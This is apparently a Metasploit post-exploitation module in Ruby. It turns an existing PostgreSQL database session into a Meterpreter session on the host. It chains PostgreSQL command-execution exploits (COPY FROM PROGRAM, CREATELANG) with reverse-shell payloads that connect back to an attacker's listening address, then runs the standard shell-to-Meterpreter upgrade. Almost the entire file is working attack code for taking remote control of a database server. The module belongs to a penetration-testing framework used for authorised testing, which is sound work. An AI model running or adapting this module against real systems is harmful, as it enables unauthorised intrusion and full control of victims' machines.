##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'SQL to Meterpreter Upgrade',
        'Description' => %q{
          This module attempts to upgrade a SQL session to meterpreter by
          leveraging existing PostgreSQL command execution modules to obtain
          a temporary command shell, then running the standard shell upgrade.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Rapid7' # Metasploit team
        ],
        'Platform' => [ 'linux', 'unix', 'osx', 'windows' ],
        'SessionTypes' => [ 'postgresql' ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        OptAddressLocal.new('LHOST',
                            [false, 'IP of host that will receive the meterpreter connection.', nil]),
        OptInt.new('LPORT',
                   [true, 'Port for the meterpreter payload to connect to.', 4433]),
        OptAddressLocal.new('SHELL_LHOST',
                            [false, 'IP of host that will receive the initial shell connection.', nil]),
        OptInt.new('SHELL_LPORT',
                   [true, 'Port for the initial shell payload to connect to.', 4444]),
        OptEnum.new('METHOD',
                    [true, 'Which PostgreSQL method to use for command execution.', 'AUTO', ['AUTO', 'COPY', 'CREATELANG']]),
        OptString.new('SHELL_PAYLOAD',
                      [false, 'Payload to use for the initial shell stage.', nil]),
        OptBool.new('SHELL_HANDLER',
                    [true, 'Start an exploit/multi/handler for the initial shell payload', true]),
        OptInt.new('SHELL_WAIT',
                   [true, 'How long to wait (in seconds) for the initial shell session.', 30])
      ]
    )
  end

  def run
    unless session&.type == 'postgresql'
      print_error('This module currently supports only PostgreSQL sessions.')
      return
    end

    upgrade_lhost = resolve_lhost(datastore['LHOST'])
    if upgrade_lhost.blank?
      print_error('Unable to determine LHOST for meterpreter. Please set LHOST.')
      return
    end

    upgrade_lport = datastore['LPORT']
    shell_lhost = datastore['SHELL_LHOST'] || upgrade_lhost
    shell_lport = datastore['SHELL_LPORT']
    shell_payload = datastore['SHELL_PAYLOAD'] || default_shell_payload

    print_status("Using shell payload #{shell_payload} to obtain a temporary session")

    methods = datastore['METHOD'] == 'AUTO' ? %w[COPY CREATELANG] : [datastore['METHOD']]

    initial_session = nil
    methods.each do |method|
      initial_session = run_postgres_method(method, shell_payload, shell_lhost, shell_lport)
      break if initial_session
    end

    unless initial_session
      print_error('Failed to obtain a shell session; aborting upgrade.')
      return
    end

    if initial_session.type == 'meterpreter'
      print_good("Meterpreter session #{initial_session.sid} already established")
      return
    end

    print_status("Upgrading shell session #{initial_session.sid} to meterpreter")
    initial_session.execute_script(
      'post/multi/manage/shell_to_meterpreter',
      "LHOST=#{upgrade_lhost}",
      "LPORT=#{upgrade_lport}"
    )
  end

  def resolve_lhost(value)
    return value unless value.blank?
    return framework.datastore['LHOST'] unless framework.datastore['LHOST'].blank?

    Rex::Socket.source_address
  end

  def default_shell_payload
    if session.platform.to_s =~ /win/i
      'cmd/windows/powershell_reverse_tcp'
    else
      'cmd/unix/reverse_perl'
    end
  end

  def run_postgres_method(method, shell_payload, shell_lhost, shell_lport)
    module_name = case method
                  when 'COPY'
                    'exploit/multi/postgres/postgres_copy_from_program_cmd_exec'
                  when 'CREATELANG'
                    'exploit/multi/postgres/postgres_createlang'
                  else
                    print_error("Unknown METHOD value: #{method}")
                    return nil
                  end

    print_status("Attempting #{method} method via #{module_name}")
    mod = framework.modules.create(module_name)
    unless mod
      print_error("Failed to initialize module #{module_name}")
      return nil
    end

    target_idx = nil
    if method == 'COPY'
      target_idx = (session.platform.to_s =~ /win/i) ? 1 : 0
    end

    opts = {
      'SESSION' => session.sid,
      'LHOST' => shell_lhost,
      'LPORT' => shell_lport
    }
    opts['DisablePayloadHandler'] = true unless datastore['SHELL_HANDLER']

    existing_ids = framework.sessions.keys

    initial_session = mod.exploit_simple(
      'Payload' => shell_payload,
      'Target' => target_idx,
      'LocalInput' => user_input,
      'LocalOutput' => user_output,
      'Options' => opts
    )

    return initial_session if initial_session

    wait_for_shell_session(existing_ids)
  end

  def wait_for_shell_session(existing_ids)
    timeout = datastore['SHELL_WAIT']

    vprint_status("Waiting up to #{timeout} seconds for the shell session to connect")
    start_time = Time.now
    loop do
      new_ids = framework.sessions.keys - existing_ids
      new_ids.each do |sid|
        new_session = framework.sessions[sid]
        next unless new_session
        return new_session if new_session.type == 'shell' || new_session.type == 'meterpreter'
      end
      break if Time.now - start_time >= timeout
      sleep 1
    end

    nil
  end
end
